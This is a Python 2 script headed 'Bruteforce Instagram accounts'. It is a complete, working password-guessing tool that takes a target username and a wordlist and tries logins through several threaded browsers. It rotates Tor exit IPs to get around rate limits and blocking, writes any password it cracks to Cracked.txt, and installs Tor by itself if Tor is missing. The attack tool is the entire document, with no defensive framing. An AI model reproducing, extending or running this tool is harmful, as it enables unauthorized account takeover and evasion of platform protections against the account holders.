# Date: 08/01/2017
# Distro: Kali Linux
# Author: Ethical-H4CK3R
# Description: Bruteforce Instagram accounts
#
#

import os
import re
import time
import argparse
import threading
import subprocess
from Queue import Queue
from platform import platform
from Core.tor import TorManager
from Core.browser import Browser

class Instagram(Browser):
 def __init__(self,username,wordlist):
  self.n = '\033[0m'  # null ---> reset
  self.r = '\033[31m' # red
  self.g = '\033[32m' # green
  self.y = '\033[33m' # yellow

  self.Ips = [] # the last 5 Ip addresses
  self.keys = [] # the next 5 passwords
  self.tries = 0
  self.alive = True
  self.br = Queue() # the 5 browsers available
  self.firstIp = True
  self.tor = TorManager()
  self.username = username
  self.wordlist = wordlist
  self.lock = threading.Lock()
  super(Instagram,self).__init__()

 def kill(self,msg=None):
  try:
   if msg != 'found':
    subprocess.call(['clear'])
    print '{}'.format(msg) if msg else '{0}[{1}-{0}]{2} Exiting {3}...{2}'.\
    format(self.y,self.r,self.n,self.g)
   self.alive = False
   self.tor.stopTor()
  finally:exit()

 def setupBrowsers(self):
  while self.alive:
   if not self.br.qsize():
    for _ in range(5):
     self.br.put(self.createBrowser())

 def setupPassword(self):
  with open(self.wordlist,'r') as passwords:
   for pwd in passwords:
    pwd = pwd.replace('\n','')
    if len(self.keys) < 5:
     self.keys.append(pwd)
    else:
     while all([self.alive,len(self.keys)]):pass
     if not len(self.keys):
      self.keys.append(pwd)

   # done reading file
   while self.alive:
    if not len(self.keys):
     self.kill()

 def manageIps(self):
  if len(self.Ips) == 5:
   del self.Ips[0]

  # stabilize the list
  if len(self.Ips) > 5:
   while all([len(self.Ips) > 4,self.alive]):
    del self.Ips[0]

 def obtainIp(self):
  ip = self.getIp()
  if ip:
   return ip
  if self.alive:
   if not self.connection():
    if self.alive:
     self.kill('{0}[{1}-{0}]{2} Lost Internet Connection'.format(self.y,self.r,self.n))

 def startlist(self,rec=5):
  currentIp = self.obtainIp()
  if not currentIp:
   if rec:
    self.startlist(rec-1)
   else:
    if self.alive:
     self.kill('{0}[{1}-{0}]{2} Unable To Contact Server'.format(self.y,self.r,self.n))
  else:
   if not currentIp in self.Ips:
    self.Ips.append(currentIp)
    self.firstIp = False

 def modifylist(self,rec=5):
  self.tor.updateIp()
  newIp = self.obtainIp()

  if not newIp:
   if rec:
    self.modifylist(rec-1)
   else:
    if self.alive:
     self.kill('{0}[{1}-{0}]{2} Unable To Contact Server'.format(self.y,self.r,self.n))
  else:
   if not newIp in self.Ips:
    self.Ips.append(newIp)
   else:
    self.modifylist()

 def changeIp(self,br):
   self.manageIps()
   if self.firstIp:
    self.startlist()
   else:
    self.modifylist()

 def attempt(self,br,user,pwd):
  with self.lock:
   if self.alive:
    subprocess.call(['clear'])
    self.display(pwd)

    # try password
    html = self.login(br,pwd)
    if html:
     if self.browser.geturl() != self.url:
      subprocess.call(['clear'])
      print '{0}[{1}-{0}]{2} Username: {4}{3}{2}'.format(self.y,self.r,self.n,self.username,self.g)
      print '{0}[{1}-{0}]{2} Password: {4}{3}{2}'.format(self.y,self.r,self.n,pwd,self.g)
      print '{0}[{1}-{0}]{2} Attempts: {0}{3}{2}'.format(self.y,self.r,self.n,self.tries+1)
      with open('Cracked.txt','a') as f:f.write('Username: {}\nPassword: {}\n\n'.\
      format(self.username,pwd))
      self.kill('found'.format(self.username,pwd))
     del self.keys[self.keys.index(pwd)]
     self.tries+=1
    else:
     if self.alive:
      self.changeIp(br)

 def display(self,pwd):
  subprocess.call(['clear'])
  print '''{0}[{1}-{0}]{2} Username: {1}{3}{2}
        \r{0}[{1}-{0}]{2} Password: {1}{4}{2}
        \r{0}[{1}-{0}]{2} Attempts: {0}{5}{2}
        '''.format(self.y,self.r,self.n,self.username,pwd,self.tries+1)

 def run(self):
  threading.Thread(target=self.setupBrowsers).start()
  threading.Thread(target=self.setupPassword).start()

  while self.alive:
   while all([self.alive,len(self.keys),self.br.qsize()]):
    bot = None # workers
    brOpen = 0 # browsers open
    tmpLst = [pwd for pwd in self.keys]

    while all([len(tmpLst),self.br.qsize(),self.alive,brOpen < 5]):
     browser = self.br.get()
     password = tmpLst[0]
     del tmpLst[0]

     if self.alive:
      bot = threading.Thread(target=self.attempt,args=[browser,self.username,password])
      bot.start()
      brOpen+=1

    # wait for bot
    if bot:
     while all([self.alive,bot.is_alive()]):pass
     if self.alive:
      self.changeIp(browser)
      browser.close()

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('username',help='Email or username')
 args.add_argument('wordlist',help='wordlist')
 args = args.parse_args()

 # assign variables
 username = args.username
 wordlist = args.wordlist
 engine = Instagram(username,wordlist)

 # does tor exists?
 if not os.path.exists('/usr/sbin/tor'):
  try:engine.tor.installTor()
  except KeyboardInterrupt:engine.kill()
  if not os.path.exists('/usr/sbin/tor'):
   engine.kill('{0}[{1}-{0}]{2} Please Install Tor'.\
   format(engine.y,engine.r,engine.n))

 # start attack
 try:
  engine.tor.updateIp()
  engine.run()
 finally:
  if engine.alive:
   engine.kill()

if __name__ == '__main__':
 if not 'kali' in platform():
  exit('Kali Linux required')

 if os.getuid():
  exit('root access required')
 else:
  main()
